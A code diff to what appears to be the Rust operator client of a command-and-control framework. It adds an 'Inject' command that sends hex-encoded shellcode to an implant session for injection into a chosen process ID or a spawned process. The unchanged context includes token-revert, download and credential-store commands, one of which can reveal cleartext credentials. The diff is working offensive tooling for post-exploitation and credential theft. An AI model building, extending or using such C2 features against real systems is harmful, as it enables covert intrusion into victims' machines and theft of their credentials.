@@ -194,6 +194,14 @@ pub enum Cmd {
     Rev2Self { session: String },
     /// 查询当前线程身份。
     GetUid { session: String },
+    /// 注入 shellcode。method/pid/spawn_to/sc_hex。
+    Inject {
+        session: String,
+        method: u8,
+        pid: u32,
+        spawn_to: String,
+        sc_hex: String,
+    },
     /// Pull the server-side credential store (`GET /api/creds`) and merge it
     /// into the local vault. `reveal` true sends `?reveal=1` for cleartext.
     FetchCreds { reveal: bool },
@@ -775,6 +783,25 @@ Cmd::Download { session, path, local } => {
                             pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}"), Level::Err),
+                    }
+                }
+                Cmd::Inject { session, method, pid, spawn_to, sc_hex } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let cmd = serde_json::json!({
+                        "type": "inject",
+                        "method": method,
+                        "pid": pid,
+                        "spawn_to": spawn_to,
+                        "sc_hex": sc_hex,
+                    });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] inject method={} pid={} (task {})", short(&session), method, pid, tid), Level::Info);
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! inject: {e}"), Level::Err),
                     }
                 }
                 Cmd::FetchCreds { reveal } => {
